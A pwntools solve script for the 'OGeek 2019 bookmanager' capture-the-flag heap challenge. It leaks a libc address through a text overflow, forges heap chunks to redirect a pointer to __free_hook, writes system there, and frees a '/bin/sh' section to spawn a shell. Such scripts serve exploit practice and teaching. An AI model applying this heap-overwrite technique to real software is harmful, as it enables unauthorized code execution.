from pwn import *

LOG_ADDR = lambda x, y: info("{} ===> {}".format(x, hex(y)))

sh = process("./data/bin/heap23_46_OGeek_2019_bookmanager")
elf = ELF("./data/bin/heap23_46_OGeek_2019_bookmanager")
libc = elf.libc

context.update(arch="amd64", os="linux", endian="little")
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def add_book(book_name):
    sh.sendlineafter("Name of the book you want to create: ", book_name)


def add_chapter(chapter_name="abc"):
    assert len(chapter_name) <= 20, "len error!"
    sh.sendlineafter("\nYour choice:", "1")
    sh.sendlineafter("\nChapter name:", chapter_name)


def add_section(chapter_name="abc", section_name="123"):
    sh.sendlineafter("\nYour choice:", "2")
    sh.sendlineafter("\nWhich chapter do you want to add into:", chapter_name)
    leak_msg = sh.recvline()
    log.info("msg recv===>{}".format(leak_msg))
    sh.sendlineafter("Section name:", section_name)
    return leak_msg


def add_text(section_name="123", size:int=0x80, text="a"):
    sh.sendlineafter("\nYour choice:", "3")
    sh.sendlineafter("\nWhich section do you want to add into:", section_name)
    sh.sendlineafter("\nHow many chapters you want to write:", str(size))
    sh.sendlineafter("\nText:", text)


def remove_chapter(chapter_name="abc"):
    sh.sendlineafter("\nYour choice:", "4")
    sh.sendlineafter("\nChapter name:", chapter_name)


def remove_section(section_name="123"):
    sh.sendlineafter("\nYour choice:", "5")
    sh.sendlineafter("\nSection name:", section_name)


def remove_text(section_name="123"):
    sh.sendlineafter("\nYour choice:", "6")
    sh.sendlineafter("\nSection name:", section_name)


def book_preview():
    sh.sendlineafter("\nYour choice:", "7")
    sh.recvuntil("\nBook:")
    msg = sh.recvuntil("\n==========================")
    log.info("msg recv:{}".format(msg))
    return msg

def update(mode=0, old_name="abc", new_name="efg"):
    sh.sendlineafter("\nYour choice:", "8")
    sh.recvuntil("\nWhat to update?(Chapter/Section/Text):")
    if mode == 0:
        sh.sendline("Chapter")
        sh.sendlineafter("\nChapter name:", old_name)
        sh.sendlineafter("\nNew Chapter name:", new_name)
        sh.recvuntil("\nUpdated")
    elif mode == 1:
        sh.sendline("Section")
        sh.sendlineafter("\nSection name:", old_name)
        sh.sendlineafter("\nNew Section name:", new_name)
        sh.recvuntil("\nUpdated")
    else:
        sh.sendline("Text")
        sh.sendlineafter("\nSection name:", old_name)
        sh.sendafter("\nNew Text:", new_name)
        sh.recvuntil("\nUpdated")


# leak libc addr
add_book("xxe")
add_chapter("a")
add_section("a", "a.a")
add_text("a.a", 0xf0, "a.a.a")
add_chapter("b")
add_section("b", "b.a")
remove_chapter("b")
update(2, "a.a", "a" * 0x100)
msg = book_preview()

#idx = msg.index(b"\x7f")
idx = msg.index(b"\n==========================") - 1
leak_libc_addr = u64(msg[idx-5:idx + 1].ljust(8, b"\x00"))
LOG_ADDR("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - 0x3c4b20 - 88
LOG_ADDR("libc_base_addr", libc_base_addr)
libc.address = libc_base_addr

# recover
update(2, "a.a", flat("a"*0xf0, 0, 0x91))
add_chapter("b")
add_section("b", "b.a")
remove_text("a.a")
add_text("a.a", 0xb0, "a.a.b")

# change section's text_ptr
add_section("a", "/bin/sh")
layout = [0xb0 * "a", 0, 0x41, 
        "/bin/sh".ljust(8, "\x00"), [0] * 3, libc.sym["__free_hook"], 32]
update(2, "a.a", flat(layout, length=0x100, filler="\x00"))

# fill system addr at __free_hook
update(2, "/bin/sh", flat([libc.sym['system']], length=0x100, filler="\x00"))

# get shell
remove_section("/bin/sh")

sh.interactive()